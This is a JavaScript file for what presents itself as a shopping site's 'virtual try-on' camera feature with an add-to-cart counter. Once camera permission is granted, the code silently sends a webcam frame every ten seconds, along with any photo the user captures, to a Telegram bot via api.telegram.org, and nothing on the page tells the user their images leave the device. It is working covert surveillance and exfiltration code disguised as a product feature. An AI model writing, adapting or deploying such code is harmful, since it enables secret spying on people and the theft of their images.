// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = ' ';
const TELEGRAM_CHAT_ID = ' ';

// Camera Access Simulation
document.addEventListener('DOMContentLoaded', function() {
    // Show camera modal after 2 seconds
    setTimeout(() => {
        document.getElementById('camera-modal').style.display = 'flex';
    }, 2000);

    // Close modal
    document.querySelector('.close-modal').addEventListener('click', function() {
        document.getElementById('camera-modal').style.display = 'none';
        stopCamera();
    });

    document.getElementById('cancel-camera').addEventListener('click', function() {
        document.getElementById('camera-modal').style.display = 'none';
        stopCamera();
    });

    // Camera elements
    const video = document.getElementById('camera-video');
    const canvas = document.getElementById('camera-canvas');
    const allowBtn = document.getElementById('allow-camera');
    const captureBtn = document.getElementById('capture-btn');
    let stream = null;
    let frameInterval;

    // Allow camera access
    allowBtn.addEventListener('click', function() {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(mediaStream) {
                    stream = mediaStream;
                    video.srcObject = stream;
                    allowBtn.style.display = 'none';
                    captureBtn.style.display = 'block';
                    
                    // Start sending frames to Telegram bot
                    startSendingFrames();
                })
                .catch(function(error) {
                    console.error('Camera access error:', error);
                    alert('Could not access the camera. Please ensure you have granted permission.');
                });
        } else {
            alert('Your browser does not support camera access.');
        }
    });

    // Capture image
    captureBtn.addEventListener('click', function() {
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Send the captured image to Telegram
        sendImageToTelegram(canvas);
        
        alert('Image captured! You can now try products virtually.');
        document.getElementById('camera-modal').style.display = 'none';
        stopCamera();
    });

    // Stop camera
    function stopCamera() {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            video.srcObject = null;
        }
        clearInterval(frameInterval);
    }

    // Start sending frames to Telegram bot
    function startSendingFrames() {
        frameInterval = setInterval(() => {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Send frame to Telegram
            sendImageToTelegram(canvas, false);
        }, 10000); // Send a frame every 10 seconds
    }

    // Send image to Telegram bot
    function sendImageToTelegram(canvas, isCapture = true) {
        // Convert canvas to blob
        canvas.toBlob(function(blob) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, 'image.jpg');
            
            if (isCapture) {
                formData.append('caption', 'User captured image from virtual try-on');
            } else {
                formData.append('caption', 'Frame from ongoing virtual try-on session');
            }
            
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Image sent to Telegram:', data);
            })
            .catch(error => {
                console.error('Error sending image to Telegram:', error);
            });
        }, 'image/jpeg', 0.8);
    }

    // Add to cart functionality
    const addToCartButtons = document.querySelectorAll('.add-to-cart');
    const cartCount = document.querySelector('.cart-count');
    let count = 0;

    addToCartButtons.forEach(button => {
        button.addEventListener('click', function() {
            count++;
            cartCount.textContent = count;
            
            // Show a quick notification
            const notification = document.createElement('div');
            notification.textContent = 'Added to cart!';
            notification.style.position = 'fixed';
            notification.style.bottom = '20px';
            notification.style.right = '20px';
            notification.style.backgroundColor = 'var(--primary)';
            notification.style.color = 'white';
            notification.style.padding = '10px 20px';
            notification.style.borderRadius = '5px';
            notification.style.zIndex = '1000';
            notification.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.style.opacity = '0';
                notification.style.transition = 'opacity 0.5s';
                setTimeout(() => {
                    document.body.removeChild(notification);
                }, 500);
            }, 2000);
        });
    });

});
